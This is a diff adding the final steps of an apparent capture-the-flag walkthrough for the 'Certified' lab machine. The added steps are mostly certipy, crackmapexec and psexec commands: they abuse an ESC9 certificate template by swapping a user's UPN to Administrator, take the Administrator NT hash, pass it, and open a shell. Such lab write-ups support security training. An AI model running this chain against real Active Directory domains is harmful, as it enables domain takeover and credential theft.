@@ -73,7 +73,40 @@ Success!
 
 ![image](https://github.com/user-attachments/assets/2a9d2c0d-966e-4345-be32-68f88bfe1f85)
 
-12. CertifiedAuthentication template has ESC9 vulnerability. 
+12. CertifiedAuthentication template has ESC9 vulnerability. To exploit ESC9 templates, set the upn of ca_operator to Administrator
+	```certipy account update -username management_svc -hashes :[NT_HASH] -upn Administrator -dc-ip [IP] -user ca_operator```
+
+![image](https://github.com/user-attachments/assets/a41bf04c-24bb-4163-9ed7-a19f9d89980a)
+
+13. Request certificate with changed upn
+	```certipy req -u ca_operator@certified.htb -p P@ssw0rd -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip [IP]```
+
+![image](https://github.com/user-attachments/assets/ca644a51-0514-427b-9fcc-d164ff246b38)
+
+14. Change back ca_operator upn to original
+	```certipy account update -username management_svc -hashes :[NT_HASH] -upn ca_operator -dc-ip [IP] -user ca_operator```
+
+![image](https://github.com/user-attachments/assets/92e33eb1-c3ca-47be-b0dd-7a2146995aa2)
+
+15. Authenticate with admin certificate and get NT hash of Administrator
+	```certipy auth -pfx administrator.pfx -domain certified.htb -dc-ip [IP]```
+
+![image](https://github.com/user-attachments/assets/b1df9eeb-8584-433b-ad17-253920ba04ff)
+
+16. Check administrator hash is correct using pass the hash
+	```crackmapexec smb [IP] -u Administrator -H [HASH]```
+
+![image](https://github.com/user-attachments/assets/34eab86c-32f0-413b-8bf5-d00b62a6feea)
+
+17. Pwned! Psexec into machine and get root flag!
+	```psexec.py Administrator@[IP] -hashes [HASH]```
+
+![image](https://github.com/user-attachments/assets/c4549cc0-4fe6-427a-a6a7-cc077521e35d)
+
+
+
+
+
 
 
 
